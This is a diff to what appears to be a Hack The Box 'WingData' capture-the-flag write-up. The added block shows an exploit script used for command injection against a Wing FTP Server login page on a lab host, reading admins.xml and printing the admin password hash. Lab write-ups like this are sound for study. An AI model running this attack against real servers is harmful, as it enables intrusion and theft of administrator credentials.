@@ -483,3 +483,41 @@ drwxr-x--- 5 wingftp wingftp 4096 Feb 15 12:04 ..
 ----------------------
 ```
 
+```
+ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "base64 ./Data/_ADMINISTRATOR/admins.xml"
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'base64 ./Data/_ADMINISTRATOR/admins.xml' and username: 'anonymous'
+[+] UID extracted: 194b85f5fd60bbd735b36cf7f1b7f896f528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 194b85f5fd60bbd735b36cf7f1b7f896f528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8QURNSU5fQUNDT1VOVFMgRGVzY3JpcHRpb249Ildpbmcg
+RlRQIFNlcnZlciBBZG1pbiBBY2NvdW50cyI+CiAgICA8QURNSU4+CiAgICAgICAgPEFkbWluX05h
+bWU+YWRtaW48L0FkbWluX05hbWU+CiAgICAgICAgPFBhc3N3b3JkPmE4MzM5ZjhlNDQ2NWE5YzQ3
+MTU4Mzk0ZDhlZmU3Y2M0NWE1ZjM2MWFiOTgzODQ0Yzg1NjJiZWYyMTkzYmFmYmE8L1Bhc3N3b3Jk
+PgogICAgICAgIDxUeXBlPjA8L1R5cGU+CiAgICAgICAgPFJlYWRvbmx5PjA8L1JlYWRvbmx5Pgog
+ICAgICAgIDxJc0RvbWFpbkFkbWluPjA8L0lzRG9tYWluQWRtaW4+CiAgICAgICAgPERvbWFpbkxp
+c3Q+PC9Eb21haW5MaXN0PgogICAgICAgIDxNeURpcmVjdG9yeT48L015RGlyZWN0b3J5PgogICAg
+ICAgIDxFbmFibGVUd29GYWN0b3I+MDwvRW5hYmxlVHdvRmFjdG9yPgogICAgICAgIDxUd29GYWN0
+b3JDb2RlPjwvVHdvRmFjdG9yQ29kZT4KICAgIDwvQURNSU4+CjwvQURNSU5fQUNDT1VOVFM+Cg==
+
+<?xml version="1.0" ?>
+<ADMIN_ACCOUNTS Description="Wing FTP Server Admin Accounts">
+    <ADMIN>
+        <Admin_Name>admin</Admin_Name>
+        <Password>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba</Password>
+        <Type>0</Type>
+        <Readonly>0</Readonly>
+        <IsDomainAdmin>0</IsDomainAdmin>
+        <DomainList></DomainList>
+        <MyDirectory></MyDirectory>
+        <EnableTwoFactor>0</EnableTwoFactor>
+        <TwoFactorCode></TwoFactorCode>
+    </ADMIN>
+</ADMIN_ACCOUNTS>
+```
+
+```
+
+```
